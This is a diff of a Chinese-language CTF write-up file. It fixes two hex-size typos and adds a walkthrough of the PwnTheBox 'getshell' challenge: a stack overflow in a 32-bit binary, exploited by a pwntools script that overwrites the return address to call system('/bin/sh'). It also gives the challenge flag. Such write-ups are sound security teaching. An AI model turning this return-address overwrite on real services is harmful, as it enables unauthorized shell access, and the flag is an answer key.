@@ -1733,7 +1733,7 @@ io.interactive()
 
 ![](https://paper.tanyaodan.com/CTFShow/1024_happy_stack/1.png)
 
-用`IDA Pro 64bit`打开附件`1024_happy_stack`，按`F5`反汇编源码并查看主函数，发现有个`char`型数组变量`s`，`s`的长度只有`0x380h`，但是`gets()`函数读取输入到变量`s`时并没有限制输入，显然存在栈溢出漏洞。注意到`ctfshow()`函数的返回值为真时会结束程序。
+用`IDA Pro 64bit`打开附件`1024_happy_stack`，按`F5`反汇编源码并查看主函数，发现有个`char`型数组变量`s`，`s`的长度只有`0x380`，但是`gets()`函数读取输入到变量`s`时并没有限制输入，显然存在栈溢出漏洞。注意到`ctfshow()`函数的返回值为真时会结束程序。
 
 ![](https://paper.tanyaodan.com/CTFShow/1024_happy_stack/2.png)
 
@@ -1795,7 +1795,7 @@ io.interactive()
 
 ![](https://paper.tanyaodan.com/CTFShow/1024_happy_checkin/1.png)
 
-用`IDA Pro 64bit`打开附件`1024_happy_checkin`，按`F5`反汇编源码并查看主函数，发现有个`char`型数组变量`s`，`s`的长度只有`0x370h`，但是`gets()`函数读取输入到变量`s`时并没有限制输入，显然存在栈溢出漏洞。
+用`IDA Pro 64bit`打开附件`1024_happy_checkin`，按`F5`反汇编源码并查看主函数，发现有个`char`型数组变量`s`，`s`的长度只有`0x370`，但是`gets()`函数读取输入到变量`s`时并没有限制输入，显然存在栈溢出漏洞。
 
 在`Function Window`中并没有找到`system()`函数和`'/bin/sh'`字符串，但是主函数中有`puts()`函数啊！程序执行前，`got`表中存放的还是`plt`表的地址，但是程序执行后，`plt`表中存放的是`got`表的地址，`got`表中存放的是函数的真实地址。因此我们可以用`ELF`来获取`puts()`函数的`plt`表和`got`表地址，进行栈溢出并通过`puts()`函数泄露`puts()`函数在`got`表中的真实地址后，进而判断`libc`的版本，然后我们可以根据`libc`版本中`puts()`函数的偏移地址来计算出`libc`的基址地址，再根据`libc`中的`system()`函数和`'/bin/sh'`字符串的偏移地址来算出函数的真实地址，从而构造`shellcode`拿到`flag`。
 
@@ -1843,6 +1843,64 @@ io.interactive()
 ```
 
 ![](https://paper.tanyaodan.com/CTFShow/1024_happy_checkin/4.png)
+
+------
+
+## PwnTheBox
+
+### [getshell](https://ce.pwnthebox.com/challenges?type=4&id=1773)
+
+先`file ./wustctf2020_getshell`查看文件类型再`checksec --file=./wustctf2020_getshell`检查了一下文件保护情况。
+
+使用`IDA pro 32bit`打开附件`wustctf2020_getshell`，按`F5`反汇编源码并查看主函数。
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  init();
+  vulnerable();
+  return 0;
+}
+```
+
+双击`vulnerable()`函数查看详情，发现有个`char`型数组变量`buf`，`buf`的长度只有`0x18`，但是`gets()`函数读取输入到变量`buf`时限制输入的大小是`0x20`，显然存在栈溢出漏洞。
+
+```c
+ssize_t vulnerable()
+{
+  char buf[24]; // [esp+0h] [ebp-18h] BYREF
+
+  return read(0, buf, 0x20u);
+}
+```
+
+此外在`Functions window`中还能看到`shell`函数，起始地址为`0x804851B`，查看`shell`函数发现返回值直接是`system("/bin/sh")`。
+
+```c
+int shell()
+{
+  return system("/bin/sh");
+}
+```
+
+构造`Payload`时先用`0x18`个字节占满`buf`变量，再用`4`个字节覆盖到栈帧，接着再加上`shell`函数的地址以调用靶机的`shell`脚本。
+
+编写`Python`代码获取靶机的`shell`权限，`cat flag`拿到本题`flag`，提交`PTB{c0d1c12f-9600-4e2a-a12b-426ba9e63083}`即可。
+
+```python
+from pwn import *
+
+context(arch='i386', os='linux', log_level='debug')
+io = remote('redirect.do-not-trust.hacking.run', 10267)
+e = ELF('./wustctf2020_getshell')
+shell = e.symbols['shell'] # 0x804851B
+log.success('shell_address => %s'%hex(shell))
+payload = b'a'*0x18 + b'pwn!' + p32(shell)
+io.sendline(payload)
+io.interactive()
+```
+
+![](https://paper.tanyaodan.com/PwnTheBox/1773/1.png)
 
 ------
 
